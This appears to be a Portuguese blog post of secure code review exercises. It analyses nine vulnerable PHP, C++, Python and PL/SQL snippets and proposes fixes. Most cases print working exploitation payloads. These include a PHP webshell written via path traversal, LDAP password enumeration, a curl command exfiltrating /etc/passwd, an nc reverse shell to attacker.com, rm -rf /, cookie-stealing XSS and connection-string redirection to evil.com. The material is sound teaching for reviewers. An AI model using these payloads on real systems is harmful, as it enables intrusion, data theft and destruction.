---
title: Secure Code Review com exercícios reais e práticos
description: 'Revisão Segura de Código em PHP, Python, C/C++ e PL/SQL'
author: matheus
tags: ["code review", "security", "vulnerabilities", "SAST", "secure coding", "python", "php", "red team", "bug bounty"]
categories: ["SecLab", "WayOfSec", "Hacking"]
pin: false
comments: true

---

## A prevenção sendo a arte de encontrar pelo em ovo (potencial perigo no código)

Se você trabalha ou quer trabalhar com segurança da informação, uma hora ou outra vai precisar olhar código e identificar problemas. Pode ser num pentest, numa auditoria, num bug bounty ou até desenvolvendo sua própria aplicação. Se você é DEV pode precisar adquirir conhecimento de segurança para te aprimorar ainda mais seu leque e evitar desenvolver algo falho. No final das contas, a questão é: você sabe reconhecer código vulnerável quando vê um?

Esse documento nasceu de uma série de exercícios de code review que eu resolvi durante meus estudos. A ideia aqui não é só dar as respostas, mas explicar o raciocínio por trás de cada vulnerabilidade - já que entender o "porquê" é muito mais útil do que decorar padrões que uma IA pode cuspir pra você a qualquer momento.

Lembro das aulas de segurança da informação na UFRJ - com o professor Claudio Miceli, que é um baita professor diga-se de passagem -, ele chegou a passar diversos trechos de códigos em sala para tentarmos na hora identificar que vulnerabilidade potencialmente teríamos nos exemplos demonstrados em sala... e quase nunca os alunos acertavam de cara. Eu mesmo nunca tinha feito isso e tive dificuldades (na verdade até hoje ainda tenho, e muito). Aquele dia tive um alerta de precisar melhorar meu faro, meu repertório, minha lógica em si a ponto de identificar métodos de burlar mais rapidamente, mesmo que apenas lendo um trecho de código.

**Uma observação importante:** as análises que apresento aqui foram feitas de forma individual, como exercício de estudo. Não tenho gabarito oficial desses exercícios - as respostas são minha interpretação baseada no que estudei. Não sou especialista em "Revisão Segura de Código" e ainda estou me aprimorando. Podendo, assim, haver imprecisões ou interpretações incompletas em alguns casos - se você identificar algo errado ou quiser complementar alguma análise, fico feliz em aprender junto. O objetivo aqui é compartilhar o processo de raciocínio, não entregar verdades absolutas. Podemos discutir sobre isso no chat (entrando via GitHub) que disponibilizo sempre ao final de cada postagem. As minhas respostas parecem estar corretas, de forma geral, então acho que é um bom material de estudo.

**Dica:** antes de ler minha análise de cada caso, tente identificar a vulnerabilidade por conta própria. Coloquei as opções de resposta logo após cada código pra você testar seu conhecimento.

## O que é Code Review de Segurança?

Code review de segurança é basicamente ler código procurando problemas que possam ser explorados. É diferente de code review normal (que foca em qualidade, legibilidade, performance) porque aqui a gente pensa como atacante: "o que eu consigo fazer de errado com isso?".

Existem duas abordagens principais. A primeira é a análise estática (SAST - Static Application Security Testing), onde você analisa o código sem executar, procurando padrões conhecidos de vulnerabilidade. Ferramentas como Semgrep, SonarQube e Bandit automatizam parte disso. A segunda é a análise manual, onde você lê o código entendendo a lógica, seguindo o fluxo de dados do input do usuário até onde ele é usado. Essa é mais trabalhosa mas pega coisas que ferramentas automatizadas perdem.

Na prática, você usa as duas. Ferramentas achando o óbvio, você achando o sutil.

## A Regra de Ouro: Siga o Input do Usuário

A maioria das vulnerabilidades acontece quando dados controlados pelo usuário chegam em lugares perigosos sem tratamento adequado. Então a primeira coisa que faço quando analiso código é identificar onde entram dados externos e rastrear pra onde eles vão.

Entradas comuns incluem `$_GET`, `$_POST`, `$_REQUEST` e `$_COOKIE` em PHP, `request.GET`, `request.POST` e `request.FILES` em Django/Python, `argv`, `getenv()` e `stdin` em C/C++, além de headers HTTP, uploads de arquivo e qualquer coisa que venha de fora do sistema.

Destinos perigosos são queries SQL, comandos do sistema, includes/requires de arquivo, outputs HTML, headers HTTP e operações de arquivo.

Se dado do usuário chega num destino perigoso sem sanitização, você provavelmente tem uma vulnerabilidade.

## Análise Prática: Dissecando Código Vulnerável

Vamos analisar alguns trechos de código reais. Pra cada um, vou explicar o que está acontecendo, qual a vulnerabilidade e como ela poderia ser explorada.

### Caso 1: O Redirect Traiçoeiro (PHP)

```php
<?php
$host  = $_SERVER['HTTP_HOST'];
$uri   = rtrim(dirname($_SERVER['PHP_SELF']), '/');
$extra = $_GET['page'];
header("Location: http://$host$uri/$extra");
exit;
?>
```

**Qual vulnerabilidade está exposta neste código?**

a) HTTP Response Splitting  
b) Reflected XSS  
c) Path Traversal  
d) Todas as anteriores

<details markdown="1">
<summary><b>Ver minha análise</b></summary>

Esse código pega um parâmetro `page` da URL e usa pra montar um redirect. Parece inofensivo, né? Só que tem problemas sérios aqui.

O primeiro é **HTTP Response Splitting** (CWE-113). A função `header()` em PHP (em versões antigas, anteriores à 5.1.2) pode aceitar quebras de linha. Se o atacante passar algo como `page=x%0d%0aSet-Cookie:%20admin=true`, ele consegue injetar headers HTTP extras na resposta. O `%0d%0a` é um CRLF (Carriage Return + Line Feed) que separa headers. Isso permite desde setar cookies arbitrários até injetar conteúdo HTML completo após um duplo CRLF. Versões modernas do PHP (5.1.2+) têm proteção contra isso e lançam um warning, mas código legado ainda é vulnerável.

Sobre o **Reflected XSS**: a ideia seria usar `javascript:alert(1)` no parâmetro `page` pra executar código. Tecnicamente isso não funciona em navegadores modernos porque eles não executam `javascript:` em headers Location - o redirect simplesmente falha ou vai pra URL literal. Porém, se combinado com HTTP Response Splitting (injetando um body HTML após duplo CRLF), você consegue XSS sim. Então depende do cenário e da versão do PHP.

O terceiro problema é **Open Redirect** (CWE-601), que facilita ataques de phishing. Um atacante pode passar `page=//site-malicioso.com` ou `page=https://site-malicioso.com` e a vítima será redirecionada pra fora do domínio legítimo. O `//` no início faz o browser usar o mesmo protocolo do site atual. Isso é muito usado em campanhas de phishing porque a URL inicial parece confiável.

E quanto ao **Path Traversal**? Essa é uma questão interessante. No contexto de redirects HTTP, o servidor não está acessando arquivos locais - ele só monta uma URL e manda pro navegador. Então tecnicamente não é Path Traversal no sentido clássico (CWE-22). Porém, se o atacante passar `page=../../../admin/` e a aplicação tiver um endpoint sensível nesse caminho, ele consegue redirecionar usuários pra lá. É mais uma manipulação de URL do que path traversal propriamente dito, mas o efeito prático pode ser similar.

**Testando na prática com Burp Suite:**

```http
GET /redirect.php?page=x%0d%0aSet-Cookie:%20pwned=true HTTP/1.1
Host: alvo.com
```

No Burp, você intercepta a requisição, modifica o parâmetro `page` e observa a resposta. Se aparecer o header `Set-Cookie: pwned=true` na resposta, confirmou o Response Splitting. Pra testar Open Redirect, basta passar uma URL externa e ver se o Location header aponta pra ela.

Considerando que HTTP Response Splitting permite injetar HTML (e por consequência XSS), que Open Redirect funciona, e que a manipulação de path é possível (mesmo que não seja path traversal no sentido clássico de acesso a arquivos), a resposta que faz mais sentido é que **todas as vulnerabilidades acima** estão presentes em algum grau. O importante é entender que cada uma depende do contexto: versão do PHP, configuração do servidor, e comportamento do navegador.

A correção ideal seria usar uma whitelist de páginas/caminhos permitidos. Se precisar aceitar URLs dinâmicas, valide que o destino está no mesmo domínio usando `parse_url()` e comparando o host. Nunca confie em input do usuário pra construir headers HTTP.

**Minha resposta: d) Todas as anteriores**

</details>

### Caso 2: A Busca que Entrega Tudo (PHP + LDAP)

```php
<?php
$dn = $_GET['host'];
$filter = "(|(sn=$person*)(givenname=$person*))";
$justthese = array("ou", "sn", "givenname", "mail");
$sr = ldap_search($ds, $dn, $dn, $justthese);
$info = ldap_get_entries($ds, $sr);
echo $info["count"]." entries returned";
?>
```

**Qual vulnerabilidade este código contém?**

a) LDAP Injection  
b) CGI Reflected XSS  
c) Connection String Injection  
d) Reflected XSS

<details markdown="1">
<summary><b>Ver minha análise</b></summary>

Aqui temos **LDAP Injection** (CWE-90). O parâmetro `host` vai direto pro `ldap_search()` como Distinguished Name (DN) sem nenhum tratamento. LDAP tem sua própria sintaxe de queries, similar a SQL, e um atacante pode manipular a busca injetando caracteres especiais.

Olhando o código mais de perto, o `$dn` (que vem do usuário) é usado tanto como base DN quanto como filtro no `ldap_search()`. Isso é duplamente problemático. Um atacante pode passar valores como `host=*))(|(objectClass=*` pra modificar a lógica da query.

Caracteres especiais em LDAP que devem ser escapados incluem: `*`, `(`, `)`, `\`, `NUL`. Por exemplo, `*` é um wildcard que retorna todos os registros. Um payload como `host=*)(uid=*))(|(uid=*` pode bypassar filtros de autenticação ou extrair dados que não deveriam ser acessíveis.

**Explorando na prática:**

Se esse código faz parte de um sistema de autenticação ou busca de usuários, você pode testar com:

```http
GET /search.php?host=*)(objectClass=* HTTP/1.1
Host: alvo.com
```

O `*` como DN base combinado com um filtro modificado pode retornar todos os objetos do diretório LDAP. Se o sistema mostra quantos registros retornaram (como faz esse código com o `echo $info["count"]`), você consegue inferir informações mesmo sem ver os dados diretamente - isso é LDAP Injection cego. Por exemplo, testando `host=*)(userPassword=a*` vs `host=*)(userPassword=b*` e comparando o número de resultados, dá pra enumerar senhas caractere por caractere.

A correção seria usar `ldap_escape()` (PHP 5.6+) no input antes de usar na query, ou implementar sanitização manual removendo/escapando os caracteres especiais do LDAP.

**Minha resposta: a) LDAP Injection**

</details>

### Caso 3: Escrevendo Onde Não Deve (PHP)

```php
<?php
$file = $_GET['file'];
$content = $_GET['content'];
file_put_contents("/some/path/$file", $content);
?>
```

**Qual vulnerabilidade está exposta neste código?**

a) Path Traversal  
b) Stored XSS  
c) Privacy Violation  
d) Todas as anteriores

<details markdown="1">
<summary><b>Ver minha análise</b></summary>

Esse é **Path Traversal** (CWE-22) clássico combinado com **Arbitrary File Write** (CWE-73). O atacante controla tanto o nome do arquivo quanto o conteúdo - isso é extremamente perigoso.

Com `file=../../../var/www/html/shell.php` e {% raw %}`content=<?php system($_GET['cmd']); ?>`{% endraw %}, o atacante acabou de criar uma webshell no servidor. Game over.

**Explorando na prática:**

```http
GET /upload.php?file=../../../var/www/html/backdoor.php&content=%3C%3Fphp%20system%28%24_GET%5B%27c%27%5D%29%3B%3F%3E HTTP/1.1
Host: alvo.com
```

Depois de criar o arquivo, o atacante acessa `http://alvo.com/backdoor.php?c=whoami` e tem execução de comando. O `%3C%3Fphp...` é só o payload PHP URL-encoded.

Mas não para por aí. Dependendo do contexto, os impactos vão além: se o servidor interpreta PHP, você tem execução de código diretamente (RCE). Dá pra causar Denial of Service sobrescrevendo arquivos críticos como `index.php` ou configs. Defacement é trivial se você modificar páginas visíveis ao público. E o pior: dá pra criar backdoors que sobrevivem a updates da aplicação.

A opção "Stored XSS" das alternativas também é válida se você escrever HTML/JS num arquivo que será servido depois, mas o impacto mais severo é definitivamente o RCE via webshell.

**Minha resposta: a) Path Traversal** (com impacto de RCE via Arbitrary File Write)

</details>

### Caso 4: O Sleep Inocente (C++)

```cpp
int i;
char inLine[64];
cin >> inLine;
i = atoi(inLine);
sleep(i);
```

**Quais são as vulnerabilidades de segurança neste código?**

a) Denial of Service  
b) Environment Injection  
c) Integer Overflow  
d) Dangerous Functions

<details markdown="1">
<summary><b>Ver minha análise</b></summary>

À primeira vista parece inofensivo - lê um número e dorme por aquele tempo. Mas tem mais de um problema aqui.

O mais óbvio é **Denial of Service (DoS)** (CWE-400). Se o usuário passar `999999999`, o programa vai ficar travado por uns 31 anos. Em aplicações web ou serviços que criam uma thread/processo por requisição, um atacante pode mandar várias requisições com valores altos e esgotar os recursos do servidor. Mesmo valores menores como `3600` (1 hora) já causariam problemas.

Mas tem outro problema que passa despercebido: **Buffer Overflow** (CWE-120). O `char inLine[64]` aloca 64 bytes, mas o `cin >> inLine` não verifica o tamanho do input. Se alguém passar uma string com mais de 63 caracteres, estoura o buffer. Em C/C++, isso pode levar desde crash até execução de código arbitrário dependendo de como a memória está organizada e das proteções do sistema (ASLR, stack canaries, etc).

Sobre as opções: a opção "d) Dangerous Functions" também tem mérito - `atoi()` é considerada insegura porque não faz validação de erro (retorna 0 tanto pra "0" quanto pra "abc"). O ideal seria usar `strtol()` com verificação de erro. A opção "c) Integer Overflow" é menos aplicável aqui porque o valor vai pra `sleep()`, não pra operações aritméticas.

**Explorando na prática:**

Pro DoS, se esse código roda como CGI ou serviço, você manda múltiplas requisições com valores altos:

```bash
# Manda 100 requisições paralelas, cada uma travando um processo por 999999 segundos
for i in {1..100}; do echo "999999999" | nc alvo.com 8080 & done
```

Pro Buffer Overflow, você precisa mandar mais de 64 caracteres. Se o binário não tem proteções modernas (compilado sem `-fstack-protector`, sem ASLR), dá pra sobrescrever o return address e redirecionar execução:

```bash
# Payload básico pra testar crash (ajuste o tamanho conforme necessário)
python -c "print('A'*100)" | ./programa_vulneravel
```

Se crashar com "Segmentation fault", você confirmou o overflow. A partir daí, com ferramentas como `gdb` e `pwntools`, dá pra desenvolver um exploit mais sofisticado.

A correção envolve duas coisas: usar `cin.getline(inLine, 64)` ou `std::string` pra evitar o overflow, e validar o range do valor antes de usar no sleep. Algo como `if (i > 0 && i < 60) sleep(i);` resolve o DoS.

**Minha resposta: a) Denial of Service** (com Buffer Overflow adicional e uso de função insegura)

</details>

### Caso 5: Manipulando Arquivos Arbitrários (Python/Django)

```python
def readFile(request):
    result = HttpResponse()
    file = request.GET.get('currentFile')
    f = open(file, 'w')
    for index, line in enumerate(f):
        result.write(str(index) + " " + line + " ")
    return result
```

**Qual vulnerabilidade este código contém?**

a) Resource Injection  
b) Path Traversal  
c) Code Injection  
d) Este código parece seguro

<details markdown="1">
<summary><b>Ver minha análise</b></summary>

**Path Traversal** (CWE-22) clássico. O parâmetro `currentFile` vai direto pro `open()` sem validação. Um atacante pode passar `currentFile=../../../etc/qualquer_coisa` e acessar arquivos fora do diretório esperado.

Mas olha o detalhe cruel: o código abre com modo `'w'` (write). Isso significa que o arquivo é **truncado** (zerado) ou criado se não existir. O código depois tenta iterar sobre ele como se fosse leitura, o que nem funciona direito - um arquivo aberto com `'w'` está vazio e não retorna nenhuma linha. Provavelmente deveria ser `'r'`. Mas do ponto de vista de segurança, o modo `'w'` é ainda pior que só leitura.

Com path traversal + modo write, um atacante pode **destruir arquivos críticos** do sistema simplesmente acessando a URL. Imagina passar `currentFile=../../../var/www/html/index.php` - você acabou de zerar o arquivo principal da aplicação. Ou pior, dependendo das permissões do processo, dá pra sobrescrever configs, crontabs, arquivos de log (destruindo evidências), ou qualquer coisa que o usuário do servidor tenha acesso de escrita.

Isso também pode ser classificado como **Resource Injection** (CWE-99) já que o atacante controla qual recurso (arquivo) será manipulado. A diferença é sutil: Path Traversal foca no escape do diretório, Resource Injection foca no controle do recurso em si.

A correção seria usar `os.path.basename()` pra extrair só o nome do arquivo, validar contra uma whitelist de arquivos permitidos, ou usar um diretório base fixo e garantir que o caminho final não escape dele com `os.path.realpath()` e verificando que o resultado começa com o diretório base.

**Minha resposta: b) Path Traversal** (com impacto de destruição de arquivos)

</details>

### Caso 6: Vazando o Ambiente (C++)

```cpp
int main() {
    cout << "Content-type: text/html" << endl;
    char* pPath;
    pPath = getenv("PATH");
    printf("First line of text file is: %s\n", pPath);
    return 0;
}
```

**Qual vulnerabilidade este código contém?**

a) Não há vulnerabilidades  
b) CGI Reflected XSS  
c) Connection String Injection  
d) Reflected XSS

<details markdown="1">
<summary><b>Ver minha análise</b></summary>

Esse código é um CGI que imprime a variável de ambiente PATH direto na resposta HTTP. O header `Content-type: text/html` faz o navegador interpretar a saída como HTML.

O problema mais óbvio aqui é **Information Disclosure** (CWE-200) - vazar o PATH do servidor revela informações sobre a estrutura do sistema, quais diretórios existem, onde estão os binários, às vezes até versões de software. Isso ajuda atacantes na fase de reconhecimento.

Mas olhando as opções da questão, o foco parece ser em **CGI Reflected XSS**. A lógica seria: se um atacante conseguir de alguma forma manipular a variável de ambiente PATH antes da execução do CGI (cenário raro mas possível em hospedagem compartilhada, containers mal configurados, ou via outras vulnerabilidades), ele poderia injetar `<script>alert(1)<\/script>` no PATH que seria renderizado como HTML. É um vetor bem específico e incomum, mas tecnicamente possível.

A diferença entre "CGI Reflected XSS" e "Reflected XSS" normal é sutil. No XSS refletido tradicional, o input vem direto do usuário via parâmetros HTTP. No caso de CGI com variáveis de ambiente, o vetor é diferente - depende de como o ambiente do CGI é configurado. Por isso a classificação como "CGI Reflected XSS" faz sentido pra diferenciar.

Na prática, o information disclosure já é problemático por si só. A correção é simples: não exponha variáveis de ambiente em respostas HTTP. Não há razão legítima pra fazer isso em produção.

**Minha resposta: b) CGI Reflected XSS**

</details>

### Caso 7: Conexão com Credenciais Expostas (C++)

```cpp
int main(int argc, char *argv[]) {
    rc = SQLConnect(Example.ConHandle, argv[0], SQL_NTS,
        (SQLCHAR *) "", SQL_NTS, (SQLCHAR *) "", SQL_NTS);
}
```

**Qual vulnerabilidade este código contém?**

a) Não há vulnerabilidades  
b) SQL Injection  
c) Connection String Injection  
d) Reflected XSS

<details markdown="1">
<summary><b>Ver minha análise</b></summary>

Aqui temos **Connection String Injection** (CWE-99 - Resource Injection). O primeiro argumento da linha de comando (`argv[0]`, que normalmente é o nome do programa mas pode ser manipulado) está sendo usado como Data Source Name (DSN) na conexão SQL via ODBC.

Um ponto importante: `argv[0]` não é necessariamente o caminho do executável. Em sistemas Unix, quando um programa é executado via `exec()`, o processo pai pode definir `argv[0]` como qualquer string. Isso é comum em symlinks, scripts wrapper, ou quando binaries são chamados por outros sistemas.

Um atacante que consiga controlar como o programa é invocado pode passar strings de conexão maliciosas. Por exemplo, em um DSN ODBC, poderia injetar parâmetros como `SERVER=evil.com;` redirecionando a conexão pra um servidor controlado por ele, onde credenciais seriam capturadas.

**Explorando na prática:**

Em sistemas Unix, você pode invocar um programa com `argv[0]` customizado usando `exec`:

```c
// wrapper_malicioso.c
#include <unistd.h>
int main() {
    char *args[] = {"SERVER=evil.com;DATABASE=roubo;", NULL};
    execv("./programa_vulneravel", args);
}
```

Ou via symlink com nome malicioso:

```bash
ln -s ./programa_vulneravel "SERVER=evil.com;UID=admin;PWD=;"
./"SERVER=evil.com;UID=admin;PWD=;"
```

Se o programa conectar no seu servidor `evil.com`, você captura tentativas de autenticação. Isso é especialmente perigoso em ambientes onde o programa é chamado por scripts de terceiros ou sistemas de orquestração.

É um vetor menos comum que SQL Injection tradicional, mas em ambientes onde binários são chamados por outros sistemas (como jobs de cron, scripts de automação, ou orquestradores), pode ser explorado. Também não confunda com SQL Injection - aqui não estamos injetando na query, mas na string de conexão.

**Minha resposta: c) Connection String Injection**

</details>

### Caso 8: Download sem Controle (PL/SQL)

```sql
BEGIN
    filename := SUBSTR(OWA_UTIL.get_cgi_env('PATH_INFO'), 2);
    WPG_DOCLOAD.download_file(filename);
END;
```

**Qual vulnerabilidade este código contém?**

a) Não há vulnerabilidades  
b) Resource Injection  
c) SQL Injection  
d) Connection String Injection

<details markdown="1">
<summary><b>Ver minha análise</b></summary>

**Resource Injection** (CWE-99) combinado com **Path Traversal** (CWE-22). O PATH_INFO (parte da URL após o script) vai direto pra função de download de arquivo sem nenhuma validação.

O `SUBSTR(..., 2)` remove o primeiro caractere (provavelmente a `/` inicial), mas não faz nenhuma sanitização. Um atacante pode manipular a URL pra baixar qualquer arquivo que o banco tenha acesso, por exemplo: `/download/../../../etc/passwd`.

Em Oracle Application Server, o `WPG_DOCLOAD.download_file` é uma procedure que serve arquivos do sistema de arquivos do servidor. O diretório base é configurado, mas se path traversal não for bloqueado, o atacante escapa dessa restrição.

Os impactos são significativos: leitura de arquivos de configuração, código fonte, credenciais hardcoded. Dependendo do que você consegue baixar, dá pra escalar o ataque consideravelmente. Acesso a dados sensíveis também pode violar LGPD, PCI-DSS e outras regulamentações.

**Explorando na prática:**

Assumindo que o script está em `http://alvo.com/pls/dad/download`, você acessa:

```text
http://alvo.com/pls/dad/download/....//....//....//etc/passwd
```

O `....//` é um bypass comum quando a aplicação faz `REPLACE(filename, '..', '')` - depois de remover `..`, sobra `../`. Se isso não funcionar, tente variações:

```text
/download/..%2f..%2f..%2fetc/passwd     (URL encoding)
/download/..%252f..%252f..%252fetc/passwd  (double encoding)
/download/....\/....\/etc/passwd       (backslash em alguns sistemas)
```

No Burp Suite, use o Intruder com uma wordlist de payloads de path traversal (o SecLists tem várias) pra automatizar os testes. Se o servidor retornar o conteúdo do arquivo ou um erro diferente (como "file not found" vs "access denied"), você sabe que o traversal funcionou.

A correção seria validar o `filename` contra uma whitelist, remover sequências `..`, usar `REPLACE(filename, '..', '')` (embora isso possa ser bypassado com `....//`), ou melhor ainda, mapear IDs numéricos para arquivos permitidos.

**Minha resposta: b) Resource Injection**

</details>

### Caso 9: O Validador de CEP Perigoso (Django)

```python
from django.http import HttpResponse, HttpResponseRedirect
from django.template import loader, Context
import os

def addressValidator(request):
    fullName = request.GET.get('fullName', None)
    address = request.GET.get('address', None)
    zipCode = request.GET.get('zip', None)
    
    zipValid = os.system('zipvalidator "' + zipCode + '" "' + address + '"')
    
    u = User(name=fullName, address=address, zipCode=zipCode, validZip=zipValid)
    t = loader.get_template('registration-form.html')
    
    return HttpResponse(t.render(Context({'user': u}, autoescape=False)))
```

**Qual vulnerabilidade este código contém?**

a) Reflected XSS  
b) Command Injection  
c) A e B estão corretos  
d) Nenhuma das anteriores

<details markdown="1">
<summary><b>Ver minha análise</b></summary>

Esse código tem dois problemas sérios. O primeiro e mais crítico é **Command Injection** (CWE-78). O `zipCode` e `address` vão direto pra um `os.system()`. Se eu passar `zip="; rm -rf / #`, o servidor vai executar `zipvalidator ""; rm -rf / #" ""`. Basicamente execução remota de código (RCE).

**Explorando Command Injection:**

```http
GET /validate?fullName=Teste&address=Rua&zip=";id;# HTTP/1.1
Host: alvo.com
```

O comando executado será: `zipvalidator "";id;#" "Rua"`. O `id` vai rodar e mostrar o usuário do servidor. Pra exfiltrar dados, você pode usar `zip=";curl http://seu-servidor.com/$(cat /etc/passwd | base64);#` e receber o conteúdo de arquivos no seu servidor via request HTTP.

Outros payloads que funcionam: `"; whoami #` pra identificar o usuário, `"; sleep 10 #` pra confirmar RCE via delay quando não tem output (blind command injection), e se quiser uma shell reversa, `"; nc -e /bin/sh attacker.com 4444 #` resolve (assumindo que netcat está disponível no servidor).

O segundo problema é **Reflected XSS** (CWE-79). Olha o `autoescape=False` no final. Isso desabilita o escape automático do Django, então qualquer coisa em `fullName`, `address` ou `zipCode` que contenha HTML/JavaScript vai ser renderizado sem tratamento. Se eu passar `fullName=<script>alert(document.cookie)<\/script>`, vai executar.

**Testando o XSS:**

{% raw %}
```http
GET /validate?fullName=<script>fetch('http://seu-servidor.com/roubo?c='+document.cookie)</script>&address=x&zip=12345 HTTP/1.1
Host: alvo.com
```
{% endraw %}

A resposta correta é que **ambas as vulnerabilidades (Command Injection e XSS)** estão presentes. O Command Injection é mais severo (permite RCE), mas o XSS também é explorável.

A correção pro command injection seria usar `subprocess.run(['zipvalidator', zipCode, address])` com lista de argumentos ao invés de string (isso evita interpretação de shell), ou melhor ainda, usar uma biblioteca Python pra validar CEP ao invés de chamar comando externo. Pro XSS, é só remover o `autoescape=False` - o Django escapa por padrão justamente pra evitar isso. Ou usar `mark_safe()` apenas em conteúdo que você confia.

**Minha resposta: c) A e B estão corretos**

</details>

## Padrões que Devem Ligar seu Alerta

Antes de mergulhar nos padrões por linguagem, aqui está um resumo rápido dos casos que analisamos:

| Caso | Linguagem | Vulnerabilidade Principal | CWE | Severidade |
|------|-----------|--------------------------|-----|------------|
| 1 | PHP | Open Redirect / HTTP Response Splitting | CWE-601/113 | Média-Alta |
| 2 | PHP | LDAP Injection | CWE-90 | Alta |
| 3 | PHP | Path Traversal + Arbitrary File Write | CWE-22 | Crítica |
| 4 | C++ | Denial of Service + Buffer Overflow | CWE-400/120 | Média-Alta |
| 5 | Python | Path Traversal | CWE-22 | Alta |
| 6 | C++ | CGI Reflected XSS / Information Disclosure | CWE-79/200 | Baixa-Média |
| 7 | C++ | Connection String Injection | CWE-99 | Média |
| 8 | PL/SQL | Resource Injection | CWE-99 | Alta |
| 9 | Python | Command Injection + XSS | CWE-78/79 | Crítica |

Depois de analisar muito código, você começa a reconhecer padrões perigosos instantaneamente. Aqui estão os principais red flags organizados por linguagem.

**PHP:**
- `$_GET`, `$_POST`, `$_REQUEST`, `$_COOKIE` indo direto pra funções perigosas
- `include()`, `require()`, `include_once()`, `require_once()` com input do usuário (LFI/RFI)
- `eval()`, `assert()`, `preg_replace()` com modificador `/e` (RCE)
- `system()`, `exec()`, `passthru()`, `shell_exec()`, backticks (Command Injection)
- `header()` com input do usuário (HTTP Response Splitting, Open Redirect)
- Queries SQL com concatenação de string em vez de prepared statements
- `file_get_contents()`, `file_put_contents()`, `fopen()` com path do usuário
- `unserialize()` com dados não confiáveis (Object Injection)

**Python:**
- `os.system()`, `os.popen()`, `subprocess` com `shell=True` (Command Injection)
- `eval()`, `exec()`, `compile()` (Code Injection)
- `pickle.loads()`, `yaml.load()` sem Loader seguro (Deserialization)
- `open()` com path do usuário sem validação (Path Traversal)
- Queries SQL com f-strings ou `.format()` (SQL Injection)
- Templates com `autoescape=False` ou `|safe` filter (XSS)
- `input()` em Python 2 (executa código - use `raw_input()`)

**C/C++:**
- `gets()` - nunca use, foi removido do C11
- `strcpy()`, `strcat()`, `sprintf()` sem verificar tamanho (Buffer Overflow)
- `scanf("%s", ...)` sem especificar largura máxima
- `printf(user_input)` - format string vulnerability
- `system()`, `popen()` com input do usuário
- `argv[]`, `getenv()` usado sem validação
- Aritmética com inteiros sem verificar overflow

**JavaScript/Node.js:**
- `eval()`, `Function()`, `setTimeout/setInterval` com strings
- `innerHTML`, `outerHTML`, `document.write()` com input do usuário (DOM XSS)
- `child_process.exec()` com input do usuário
- Express.js sem `helmet` ou headers de segurança
- `JSON.parse()` de fonte não confiável sem try-catch

De forma geral, desconfie sempre que input do usuário chega em funções que executam código, acessam arquivos, fazem queries ou geram output HTML. A regra é: **valide, sanitize, escape** - nessa ordem.

## Metodologia de Code Review

Quando pego um código pra analisar, sigo mais ou menos essa abordagem. Primeiro identifico os pontos de entrada, ou seja, onde dados externos entram no sistema - formulários, APIs, arquivos, variáveis de ambiente, argumentos de linha de comando.

Depois rastreio o fluxo de dados, seguindo cada input até ver onde ele é usado. Ferramentas de análise de taint ajudam nisso, mas pra código pequeno dá pra fazer na mão.

Em seguida verifico os destinos, checando se quando o dado chega num lugar sensível (SQL, sistema de arquivos, output HTML, comando do sistema), ele passou por alguma validação ou sanitização.

É importante também considerar o contexto. Uma mesma função pode ser segura num contexto e perigosa em outro. `htmlspecialchars()` protege contra XSS em HTML, mas não ajuda nada se o dado vai pra uma query SQL.

Por fim, pense como atacante. Que input malicioso eu poderia passar? O que acontece se eu passar string vazia? E se for muito grande? E se tiver caracteres especiais?

## Ferramentas que Ajudam

Pra análise automatizada, uso algumas ferramentas dependendo da linguagem. **Semgrep** é excelente e suporta várias linguagens - dá pra escrever regras customizadas. **Bandit** é específico pra Python e pega bastante coisa. **PHPStan** e **Psalm** fazem análise estática de PHP. **SonarQube** é mais enterprise mas tem versão community boa. **CodeQL** do GitHub é poderoso pra análises complexas.

Mas lembre: ferramentas são complemento, não substituto. Elas pegam o óbvio e te dão um ponto de partida, mas vulnerabilidades de lógica de negócio e casos edge só humano pega.

## Os Três Pilares do AppSec: SAST, DAST e SCA

Já que estamos falando de ferramentas e metodologias, vale entender as três abordagens principais que o mercado usa pra encontrar vulnerabilidades em aplicações. Code review manual é importante, mas em projetos grandes você precisa de automação - e cada tipo de ferramenta pega problemas diferentes.

**SAST (Static Application Security Testing)** é o que fizemos nesse documento: analisar código sem executar. As ferramentas de SAST leem o código fonte, constroem um modelo do fluxo de dados, e procuram padrões conhecidos de vulnerabilidade. Semgrep, SonarQube, Checkmarx, Fortify - todas essas são ferramentas SAST.

A vantagem do SAST é que você encontra problemas cedo, antes mesmo de rodar o código. Dá pra integrar no CI/CD e bloquear merges que introduzem vulnerabilidades. A desvantagem é que gera muitos falsos positivos (alertas de coisas que não são realmente vulneráveis) e não consegue pegar problemas que só aparecem em runtime - tipo configurações erradas de servidor ou vulnerabilidades que dependem do estado da aplicação.

**DAST (Dynamic Application Security Testing)** é o oposto: você testa a aplicação rodando, mandando requisições maliciosas e vendo como ela responde. É basicamente o que um scanner de vulnerabilidades faz - OWASP ZAP, Burp Suite Scanner, Nikto, Nuclei. Você aponta pra URL e a ferramenta tenta explorar XSS, SQL Injection, etc.

A vantagem do DAST é que encontra vulnerabilidades reais, exploráveis, no ambiente real. Se o DAST acha algo, provavelmente é um problema de verdade. A desvantagem é que precisa da aplicação rodando, é mais lento, e não te diz onde no código está o problema - só que ele existe. Também não consegue testar funcionalidades que exigem autenticação complexa ou fluxos específicos sem configuração manual.

**SCA (Software Composition Analysis)** cuida de um problema diferente: vulnerabilidades em dependências de terceiros. Seu código pode estar perfeito, mas se você usa uma biblioteca com CVE conhecida, sua aplicação está vulnerável. Ferramentas como Dependabot, Snyk, OWASP Dependency-Check e Trivy escaneiam seu package.json, requirements.txt, pom.xml e comparam com bancos de dados de vulnerabilidades conhecidas.

Isso é mais importante do que parece. Estudos mostram que mais de 80% do código em aplicações modernas vem de dependências. Aquele npm install que você faz sem pensar pode estar puxando centenas de pacotes transitivos, cada um com seu próprio histórico de vulnerabilidades.

Na prática, um programa de segurança maduro usa os três. SAST no desenvolvimento pra pegar problemas cedo, SCA contínuo pra monitorar dependências, e DAST em staging/produção pra validar que nada escapou. Code review manual entra pra pegar o que as ferramentas perdem - vulnerabilidades de lógica de negócio, problemas de design, e aqueles bugs sutis que só um humano entendendo o contexto consegue identificar.

## Referências e Recursos para Aprofundamento

Se você quer ir mais fundo em code review de segurança, aqui estão alguns recursos que eu uso e recomendo.

**Documentação e Referência:**

O **OWASP Code Review Guide** é a referência mais completa que existe sobre o assunto. É gratuito e cobre metodologia, vulnerabilidades por linguagem, e casos práticos. O **OWASP Testing Guide** complementa bem, focando mais no lado de DAST. Ambos disponíveis em [owasp.org](https://owasp.org).

O **CWE (Common Weakness Enumeration)** é um catálogo de tipos de vulnerabilidades. Cada vulnerabilidade que mencionei nesse documento tem um CWE correspondente:

- Command Injection: CWE-78
- Path Traversal: CWE-22
